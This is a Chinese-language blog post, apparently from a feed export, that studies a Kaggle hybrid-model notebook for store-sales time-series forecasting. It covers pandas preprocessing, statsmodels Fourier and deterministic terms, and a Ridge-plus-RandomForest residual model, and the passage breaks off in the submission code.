      <title>Kaggle_warmup3-TimeSeries(2)</title>
      <link href="/2024/04/08/Kaggle-warmup3-TimeSeries-2/"/>
      <url>/2024/04/08/Kaggle-warmup3-TimeSeries-2/</url>
      
        <content type="html"><![CDATA[<p>继续上次的TimeSeries问题,这次看的notebook是另一个人写的<a href="https://www.kaggle.com/code/closen/experimenting-with-a-hybrid-model">hybridmodel</a></p><h2 id="preprocessing">preprocessing</h2><p>首先前面数据处理和表合并部分大同小异. <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> LinearRegression</span><br><span class="line"><span class="keyword">from</span> sklearn.multioutput <span class="keyword">import</span> RegressorChain</span><br><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> LabelEncoder</span><br><span class="line"><span class="keyword">from</span> xgboost <span class="keyword">import</span> XGBRegressor</span><br><span class="line"><span class="keyword">from</span> sklearn.multioutput <span class="keyword">import</span> RegressorChain</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split</span><br><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> mean_squared_log_error</span><br><span class="line"><span class="keyword">from</span> statsmodels.tsa.deterministic <span class="keyword">import</span> DeterministicProcess, CalendarFourier</span><br><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> OneHotEncoder</span><br><span class="line"><span class="comment"># Input data files are available in the read-only &quot;../input/&quot; directory</span></span><br><span class="line"><span class="comment"># For example, running this (by clicking run or pressing Shift+Enter) will list all files under the input directory</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">for</span> dirname, _, filenames <span class="keyword">in</span> os.walk(<span class="string">&#x27;/kaggle/input&#x27;</span>):</span><br><span class="line">    <span class="keyword">for</span> filename <span class="keyword">in</span> filenames:</span><br><span class="line">        <span class="built_in">print</span>(os.path.join(dirname, filename))</span><br><span class="line"></span><br><span class="line">comp_dir = Path(<span class="string">&#x27;../input/store-sales-time-series-forecasting&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Importing oil prices dataset</span></span><br><span class="line">oil_prices = pd.read_csv(<span class="string">&quot;/kaggle/input/store-sales-time-series-forecasting/oil.csv&quot;</span>,</span><br><span class="line">                         parse_dates=[<span class="string">&#x27;date&#x27;</span>],</span><br><span class="line">                         infer_datetime_format=<span class="literal">True</span>)</span><br><span class="line">oil_prices[<span class="string">&#x27;date&#x27;</span>] = oil_prices.date.dt.to_period(<span class="string">&quot;D&quot;</span>)</span><br><span class="line">oil_prices.set_index(<span class="string">&#x27;date&#x27;</span>, inplace=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Importing holidays dataset</span></span><br><span class="line">holidays = pd.read_csv(<span class="string">&#x27;/kaggle/input/store-sales-time-series-forecasting/holidays_events.csv&#x27;</span>,</span><br><span class="line">                       parse_dates=[<span class="string">&#x27;date&#x27;</span>],</span><br><span class="line">                       infer_datetime_format=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">holidays[<span class="string">&#x27;date&#x27;</span>] = holidays.date.dt.to_period(<span class="string">&#x27;D&#x27;</span>)</span><br><span class="line"></span><br><span class="line">store_sales = pd.read_csv(</span><br><span class="line">    comp_dir / <span class="string">&#x27;train.csv&#x27;</span>,</span><br><span class="line">    usecols=[<span class="string">&#x27;store_nbr&#x27;</span>, <span class="string">&#x27;family&#x27;</span>, <span class="string">&#x27;date&#x27;</span>, <span class="string">&#x27;sales&#x27;</span>, <span class="string">&#x27;onpromotion&#x27;</span>],</span><br><span class="line">    dtype=&#123;</span><br><span class="line">        <span class="string">&#x27;store_nbr&#x27;</span>: <span class="string">&#x27;category&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;family&#x27;</span>: <span class="string">&#x27;category&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;sales&#x27;</span>: <span class="string">&#x27;float32&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;onpromotion&#x27;</span>: <span class="string">&#x27;uint32&#x27;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    parse_dates=[<span class="string">&#x27;date&#x27;</span>],</span><br><span class="line">)</span><br><span class="line">store_sales[<span class="string">&#x27;date&#x27;</span>] = store_sales.date.dt.to_period(<span class="string">&#x27;D&#x27;</span>)</span><br><span class="line">store_sales = store_sales.set_index([<span class="string">&#x27;store_nbr&#x27;</span>, <span class="string">&#x27;family&#x27;</span>, <span class="string">&#x27;date&#x27;</span>]).sort_index()</span><br><span class="line"></span><br><span class="line">family_sales = (</span><br><span class="line">    store_sales</span><br><span class="line">    .groupby([<span class="string">&#x27;family&#x27;</span>, <span class="string">&#x27;date&#x27;</span>],observed=<span class="literal">False</span>)</span><br><span class="line">    .mean()</span><br><span class="line">    .unstack(<span class="string">&#x27;family&#x27;</span>)</span><br><span class="line">    .loc[<span class="string">&#x27;2017&#x27;</span>]</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">test = pd.read_csv(</span><br><span class="line">    comp_dir / <span class="string">&#x27;test.csv&#x27;</span>,</span><br><span class="line">    dtype=&#123;</span><br><span class="line">        <span class="string">&#x27;store_nbr&#x27;</span>: <span class="string">&#x27;category&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;family&#x27;</span>: <span class="string">&#x27;category&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;onpromotion&#x27;</span>: <span class="string">&#x27;uint32&#x27;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    parse_dates=[<span class="string">&#x27;date&#x27;</span>],</span><br><span class="line">)</span><br><span class="line">test[<span class="string">&#x27;date&#x27;</span>] = test.date.dt.to_period(<span class="string">&#x27;D&#x27;</span>)</span><br><span class="line">test = test.set_index([<span class="string">&#x27;store_nbr&#x27;</span>, <span class="string">&#x27;family&#x27;</span>, <span class="string">&#x27;date&#x27;</span>]).sort_index()</span><br></pre></td></tr></table></figure> 这里主要是对时间类型进行转换,同时set一下index</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Splitting the holidays in three dataset on the basis of locale</span></span><br><span class="line">holidays_N = holidays[holidays.locale == <span class="string">&#x27;National&#x27;</span>]</span><br><span class="line"><span class="comment"># Dropping the locale column as we don&#x27;t need it anymore</span></span><br><span class="line">holidays_N.drop(<span class="string">&#x27;locale&#x27;</span>, axis=<span class="number">1</span>, inplace=<span class="literal">True</span>)</span><br><span class="line">holidays_N.drop_duplicates(subset=<span class="string">&#x27;date&#x27;</span>, keep=<span class="string">&#x27;first&#x27;</span>, inplace=<span class="literal">True</span>)</span><br><span class="line">holidays_N.set_index(<span class="string">&#x27;date&#x27;</span>, inplace=<span class="literal">True</span>)</span><br><span class="line">OH = OneHotEncoder(sparse=<span class="literal">False</span>)</span><br><span class="line">holidays_N_OH = pd.DataFrame(</span><br><span class="line">    OH.fit_transform(holidays_N[[<span class="string">&#x27;description&#x27;</span>]]), </span><br><span class="line">    index=holidays_N.index, </span><br><span class="line">    columns=OH.get_feature_names_out([<span class="string">&#x27;description&#x27;</span>])</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">full_train_data = store_sales.merge(holidays_N_OH, how=<span class="string">&#x27;left&#x27;</span>, left_index=<span class="literal">True</span>, right_index=<span class="literal">True</span>)</span><br><span class="line">full_train_data.fillna(<span class="number">0</span>, inplace=<span class="literal">True</span>)</span><br><span class="line">full_train_data = full_train_data.merge(oil_prices, how=<span class="string">&#x27;left&#x27;</span>, left_index=<span class="literal">True</span>, right_index=<span class="literal">True</span>)</span><br><span class="line">full_train_data[<span class="string">&#x27;dcoilwtico&#x27;</span>].fillna(method=<span class="string">&#x27;ffill&#x27;</span>, inplace=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># Create new columns</span></span><br><span class="line">date = full_train_data.index.get_level_values(<span class="string">&#x27;date&#x27;</span>)</span><br><span class="line">full_train_data[<span class="string">&#x27;week_day&#x27;</span>] = date.weekday</span><br><span class="line">full_train_data[<span class="string">&#x27;month_day&#x27;</span>] = date.day</span><br><span class="line">full_train_data[<span class="string">&#x27;year_day&#x27;</span>] = date.day_of_year</span><br><span class="line"></span><br><span class="line">full_train_data = full_train_data.fillna(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>这里时间还是按照week,month,year做了列分割,不过需要注意的是这里作者对holiday进行了one_hot_encoding,所以后面查看数据会有70多列. <img src="full_data.png" alt="full_data" /></p><h2 id="statsmodels相关">statsmodels相关</h2><p>再后面作者写了一个hybrid模型,有点残差网络的意思,不过这个先放一放,先看看<code>statsmodels.tsa.deterministic</code>的相关内容,首先是<code>statsmodels.tsa.deterministic.CalendarFourier</code>,这个函数可以按日历生成相关傅立叶级数. <img src="calendarFourier.png" alt="fourier" /></p><p>举个例子 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">fourier = CalendarFourier(freq=<span class="string">&quot;W&quot;</span>, order=<span class="number">2</span>)</span><br><span class="line">dp_train = DeterministicProcess(</span><br><span class="line">    index=y_train.index,</span><br><span class="line">    constant=<span class="literal">True</span>,</span><br><span class="line">    order=<span class="number">1</span>,</span><br><span class="line">    seasonal=<span class="literal">True</span>,</span><br><span class="line">    additional_terms=[fourier],</span><br><span class="line">    drop=<span class="literal">True</span>,</span><br><span class="line">)</span><br><span class="line">fourier.in_sample(y_train.index)[:<span class="number">20</span>]</span><br></pre></td></tr></table></figure> 这里的freq我设置成了week,order设为2,那么每周一回到周期开始就会令sin为0,cos为1.</p><p>过一天到达周二就会令<code>$ \tau = 1$</code>, 即sin值变为 <code>$sin(order* \pi * \frac&#123;1&#125;&#123;7&#125;)$</code> , 所以也有了下面这些计算</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> math</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>math.sin(<span class="number">0</span>)</span><br><span class="line"><span class="number">0.0</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>math.sin(math.pi*<span class="number">2</span>/<span class="number">7</span>)</span><br><span class="line"><span class="number">0.7818314824680298</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>math.sin(<span class="number">2</span>*math.pi*<span class="number">2</span>/<span class="number">7</span>)</span><br><span class="line"><span class="number">0.9749279121818236</span></span><br></pre></td></tr></table></figure><p><img src="weekFourier.png" /></p><p>然后是<code>DeterministicProcess</code>的处理 <img src="deterministic.png" /></p><p>这里指定了season,然后season是依据index来判断的 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># https://www.statsmodels.org/devel/_modules/statsmodels/tsa/deterministic.html#DeterministicProcess</span></span><br><span class="line"><span class="keyword">if</span> (seasonal <span class="keyword">or</span> fourier) <span class="keyword">and</span> period <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">if</span> period <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                self._period = period = freq_to_period(self._index_freq)</span><br></pre></td></tr></table></figure></p><p>其中我们的index_freq为day,跳转到freq_to_period <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># https://www.statsmodels.org/dev/_modules/statsmodels/tsa/tsatools.html</span></span><br><span class="line"><span class="keyword">if</span> freq <span class="keyword">in</span> (<span class="string">&quot;A&quot;</span>, <span class="string">&quot;Y&quot;</span>) <span class="keyword">or</span> freq.startswith(yearly_freqs):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> freq == <span class="string">&quot;Q&quot;</span> <span class="keyword">or</span> freq.startswith((<span class="string">&quot;Q-&quot;</span>, <span class="string">&quot;QS&quot;</span>, <span class="string">&quot;QE&quot;</span>)):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">4</span></span><br><span class="line">    <span class="keyword">elif</span> freq == <span class="string">&quot;M&quot;</span> <span class="keyword">or</span> freq.startswith((<span class="string">&quot;M-&quot;</span>, <span class="string">&quot;MS&quot;</span>, <span class="string">&quot;ME&quot;</span>)):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">12</span></span><br><span class="line">    <span class="keyword">elif</span> freq == <span class="string">&quot;W&quot;</span> <span class="keyword">or</span> freq.startswith(<span class="string">&quot;W-&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">52</span></span><br><span class="line">    <span class="keyword">elif</span> freq == <span class="string">&quot;D&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">7</span></span><br><span class="line">    <span class="keyword">elif</span> freq == <span class="string">&quot;B&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">5</span></span><br><span class="line">    <span class="keyword">elif</span> freq == <span class="string">&quot;H&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">24</span></span><br></pre></td></tr></table></figure></p><p>即可发现是相当于period为7的seasonal. 不过这里fourier并没有作为额外项加入,个人也不太理解出于什么考虑. 然后获取数据加丢入模型的代码如下,数据处理过程分析好了喂数据反而简单了.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Linear Regression</span></span><br><span class="line"></span><br><span class="line">y_train = full_train_data.unstack([<span class="string">&#x27;store_nbr&#x27;</span>, <span class="string">&#x27;family&#x27;</span>]).loc[<span class="string">&#x27;2016&#x27;</span>:]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Create Training Data</span></span><br><span class="line">fourier = CalendarFourier(freq=<span class="string">&quot;D&quot;</span>, order=<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">dp_train = DeterministicProcess(</span><br><span class="line">    index=y_train.index,</span><br><span class="line">    constant=<span class="literal">True</span>,</span><br><span class="line">    order=<span class="number">1</span>,</span><br><span class="line">    seasonal=<span class="literal">True</span>,</span><br><span class="line">    additional_terms=[fourier],</span><br><span class="line">    drop=<span class="literal">True</span>,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">X_train = dp_train.in_sample()</span><br><span class="line">X_train[<span class="string">&#x27;NewYear&#x27;</span>] = (X_train.index.dayofyear == <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">model_LR = LinearRegression()</span><br><span class="line">model_LR.fit(X_train,y_train)</span><br><span class="line">y_pred_LR = pd.DataFrame(model_LR.predict(X_train), index=y_train.index, columns=y_train.columns)</span><br></pre></td></tr></table></figure><h2 id="prepare-training-data-for-hybrid-model">prepare training data for hybrid model</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># For the first model :</span></span><br><span class="line"></span><br><span class="line">y = full_train_data.unstack([<span class="string">&#x27;store_nbr&#x27;</span>, <span class="string">&#x27;family&#x27;</span>]).loc[<span class="string">&#x27;2017&#x27;</span>]</span><br><span class="line"></span><br><span class="line">fourier = CalendarFourier(freq=<span class="string">&#x27;D&#x27;</span>, order=<span class="number">4</span>)</span><br><span class="line">dp = DeterministicProcess(</span><br><span class="line">    index=y.index,</span><br><span class="line">    constant=<span class="literal">True</span>,</span><br><span class="line">    order=<span class="number">1</span>,</span><br><span class="line">    seasonal=<span class="literal">True</span>,</span><br><span class="line">    additional_terms=[fourier],</span><br><span class="line">    drop=<span class="literal">True</span>,</span><br><span class="line">)</span><br><span class="line">X_1 = dp.in_sample()</span><br><span class="line">X_1[<span class="string">&#x27;NewYear&#x27;</span>] = (X_1.index.dayofyear == <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># For the second model :</span></span><br><span class="line"></span><br><span class="line">X_2 = y.stack(future_stack=<span class="literal">True</span>)</span><br><span class="line">X_2 = X_2.stack(future_stack=<span class="literal">True</span>)</span><br><span class="line">X_2 = X_2.reset_index()</span><br><span class="line">X_2.set_index(<span class="string">&#x27;date&#x27;</span>, inplace = <span class="literal">True</span>)</span><br><span class="line">X_2[<span class="string">&#x27;day&#x27;</span>] = X_2.index.dayofweek</span><br><span class="line"><span class="keyword">for</span> colname <span class="keyword">in</span> X_2.select_dtypes([<span class="string">&quot;object&quot;</span>, <span class="string">&quot;category&quot;</span>]):</span><br><span class="line">    X_2[colname], _ = X_2[colname].factorize()</span><br><span class="line">X_2 = X_2.drop(<span class="string">&#x27;sales&#x27;</span>, axis =<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h2 id="hybrid-model">hybrid model</h2><p>到这里我们再回过头看最终预测的模型的结构, 这里看到模型1做对y的预测, 模型2在得到y和y_pred之后,对其差值进行预测,即我之前说的有点像残差网络. <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">make_lags</span>(<span class="params">ts, lags, lead_time=<span class="number">1</span></span>):</span><br><span class="line">    <span class="keyword">return</span> pd.concat(</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">f&#x27;y_lag_<span class="subst">&#123;i&#125;</span>&#x27;</span>: ts.shift(i)</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(lead_time, lags + lead_time)</span><br><span class="line">        &#125;,</span><br><span class="line">        axis=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_multistep_target</span>(<span class="params">ts, steps</span>):</span><br><span class="line">    <span class="keyword">return</span> pd.concat(</span><br><span class="line">        &#123;<span class="string">f&#x27;y_step_<span class="subst">&#123;i + <span class="number">1</span>&#125;</span>&#x27;</span>: ts.shift(-i)</span><br><span class="line">         <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(steps)&#125;,</span><br><span class="line">        axis=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Compute RMSLE</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rmsle</span>(<span class="params">y_true, y_pred</span>):</span><br><span class="line">    <span class="keyword">return</span> np.sqrt(mean_squared_log_error(y_true, y_pred))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BoostedHybrid</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, model_1, model_2</span>):</span><br><span class="line">        self.model_1 = model_1</span><br><span class="line">        self.model_2 = model_2</span><br><span class="line">        self.y_columns = <span class="literal">None</span>  <span class="comment"># store column names from fit method</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">fit</span>(<span class="params">self, y,X_1, X_2</span>):</span><br><span class="line"></span><br><span class="line">        self.model_1.fit(X_1, y)</span><br><span class="line">        y_fit = pd.DataFrame(</span><br><span class="line">            <span class="comment"># YOUR CODE HERE: make predictions with self.model_1</span></span><br><span class="line">            self.model_1.predict(X_1),</span><br><span class="line">            index=X_1.index, columns=y.columns,</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        y_fit = y_fit.stack(future_stack=<span class="literal">True</span>)</span><br><span class="line">        y_fit =y_fit.stack(future_stack=<span class="literal">True</span>)</span><br><span class="line">        y_fit =y_fit.reset_index()</span><br><span class="line">        y_fit[<span class="string">&#x27;sales&#x27;</span>] = y_fit[<span class="string">&#x27;sales&#x27;</span>].astype(<span class="string">&#x27;int64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        y_bis = y.stack(future_stack=<span class="literal">True</span>)</span><br><span class="line">        y_bis =y_bis.stack(future_stack=<span class="literal">True</span>)</span><br><span class="line">        y_bis = y_bis.reset_index()</span><br><span class="line"></span><br><span class="line">        y_resid = y_bis[<span class="string">&#x27;sales&#x27;</span>] - y_fit[<span class="string">&#x27;sales&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        self.model_2.fit(X_2, y_resid)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Save column names for predict method</span></span><br><span class="line">        self.y_columns = y.columns</span><br><span class="line">        <span class="comment"># Save data for question checking</span></span><br><span class="line">        self.y_fit = y_fit</span><br><span class="line">        self.y_resid = y_resid</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">predict</span>(<span class="params">self, X_test_1</span>):</span><br><span class="line"></span><br><span class="line">        y_submit = pd.DataFrame(self.model_1.predict(X_test_1), index=X_test_1.index, columns=y.columns)</span><br><span class="line">        y_submit = y_submit.stack()</span><br><span class="line">        y_submit = y_submit.stack()</span><br><span class="line">        X_test_2 = y_submit</span><br><span class="line">        X_test_2 = X_test_2.reset_index([<span class="string">&#x27;family&#x27;</span>,<span class="string">&#x27;store_nbr&#x27;</span>])</span><br><span class="line">        X_test_2[<span class="string">&#x27;day&#x27;</span>] = X_test_2.index.dayofweek</span><br><span class="line">        X_test_2 = X_test_2.drop(<span class="string">&#x27;sales&#x27;</span>,axis =<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> colname <span class="keyword">in</span> X_test_2.select_dtypes([<span class="string">&quot;object&quot;</span>, <span class="string">&quot;category&quot;</span>]):</span><br><span class="line">            X_test_2[colname], _ = X_test_2[colname].factorize()</span><br><span class="line">        y_test = self.model_2.predict(X_test_2) + y_submit[<span class="string">&#x27;sales&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        y_test = y_test.reset_index()</span><br><span class="line">        y_test = y_test.set_index([<span class="string">&#x27;store_nbr&#x27;</span>, <span class="string">&#x27;family&#x27;</span>, <span class="string">&#x27;date&#x27;</span>]).sort_index()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> y_test  <span class="comment"># long to wide</span></span><br></pre></td></tr></table></figure></p><p>定义结束了后续填充模型即可 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Fit the model</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Model 1 (trend)</span></span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> ElasticNet, Lasso, Ridge</span><br><span class="line"></span><br><span class="line"><span class="comment"># Model 2 (residuals)</span></span><br><span class="line"><span class="keyword">from</span> sklearn.ensemble <span class="keyword">import</span> ExtraTreesRegressor, RandomForestRegressor, GradientBoostingRegressor</span><br><span class="line"><span class="keyword">from</span> sklearn.neighbors <span class="keyword">import</span> KNeighborsRegressor</span><br><span class="line"><span class="keyword">from</span> sklearn.neural_network <span class="keyword">import</span> MLPRegressor</span><br><span class="line"></span><br><span class="line">model_hybrid = BoostedHybrid(</span><br><span class="line">    Ridge(),</span><br><span class="line">    RandomForestRegressor()</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">model_hybrid.fit(y,X_1,X_2)</span><br></pre></td></tr></table></figure></p><p>最后对submission的处理进行处理并丢进模型预测,输出存submission <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Preparing data for submission</span></span><br><span 